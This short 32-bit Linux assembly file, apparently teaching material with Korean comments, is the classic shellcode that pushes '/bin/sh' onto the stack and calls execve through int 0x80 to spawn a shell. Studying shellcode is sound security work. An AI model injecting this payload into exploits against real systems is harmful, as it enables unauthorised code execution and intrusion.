section .text
    global _start

_start:
    xor eax, eax ; eax = 0
    push eax ; push 0
    
    push 0x68732f2f ; push "//sh"
    push 0x6e69622f ; push "/bin"
    mov ebx, esp ; ebx = &"/bin/sh" (문자열 주소)
    
    xor edx, edx ; 세 번째 인자 0
    xor ecx, ecx ; 두 번째 인자 0
    
    mov al, 0xb ; execve("/bin/sh", NULL, NULL)
    int 0x80 ; syscall
